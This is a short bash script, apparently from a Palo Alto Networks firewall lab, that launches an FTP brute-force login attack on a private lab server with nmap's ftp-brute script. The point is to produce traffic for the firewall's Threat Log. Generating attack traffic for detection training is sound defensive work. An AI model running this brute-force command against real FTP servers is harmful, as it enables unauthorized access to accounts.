#!/bin/bash
#
# Jan 16, 2020
# FTP Brute Force Login Attack
#
# Bill Claunch
# Palo Alto Network, Inc.
#
# The following command runs a brute-force login attack against the FTP server in
# the lab environment.
clear
echo "Running Brute Force FTP Login Attack against FTP Lab Server..."
echo ""
echo "nmap --script ftp-brute 192.168.50.10 -p 21"
nmap --script ftp-brute 192.168.50.10 -p 21
echo ""
echo "Complete."
echo "Check the firewall Threat Log for results."

